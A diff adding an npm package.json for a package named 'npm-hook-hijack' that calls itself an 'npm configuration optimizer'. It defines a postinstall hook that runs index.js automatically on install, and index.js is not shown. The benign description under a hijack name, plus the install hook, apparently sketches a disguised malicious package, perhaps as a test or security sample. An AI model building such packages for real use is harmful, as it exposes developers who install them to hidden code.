@@ -1,0 +1,9 @@
+{
+  "name": "npm-hook-hijack",
+  "version": "1.0.0",
+  "description": "npm configuration optimizer",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node index.js"
+  }
+}
